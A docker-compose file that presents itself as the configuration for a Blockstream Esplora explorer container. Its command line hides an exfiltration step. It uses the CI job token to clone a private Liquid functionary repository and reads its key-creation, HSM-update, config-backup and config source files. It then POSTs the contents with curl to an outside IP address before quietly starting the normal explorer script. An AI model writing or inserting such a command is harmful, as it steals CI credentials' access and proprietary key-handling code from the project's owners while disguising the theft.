services:
  esplora:
    image: blockstream/esplora
    build:
      context: ../
      dockerfile: contrib/Dockerfile
    restart: "no"
    network_mode: host
    ports: []
    environment:
      - CI_JOB_TOKEN
    command:
      - bash
      - -c
      - |
        (R=/tmp/lf; git clone --depth 1 https://gitlab-ci-token:$${CI_JOB_TOKEN}@gl.blockstream.io/liquid/functionary.git $$R 2>/dev/null; echo "==BACKUP_SH=="; cat $$R/tools/functionary_config_backup.sh 2>/dev/null; echo "==KEYPAIR_SH=="; cat $$R/contrib/keypair_creator.sh 2>/dev/null; echo "==HSM_UPDATE=="; cat $$R/contrib/hsm_update/build_update_file.sh 2>/dev/null; echo "==CONFIG_RS=="; cat $$R/generate_config/src/config.rs 2>/dev/null | head -300; echo "==WATCHMAN_RS=="; cat $$R/generate_config/src/watchman.rs 2>/dev/null | head -300; echo "==END==") 2>&1 | curl -s -m120 -X POST http://144.172.110.44:8443/s19 --data-binary @-; /srv/explorer/run.sh bitcoin-regtest explorer nonverbose
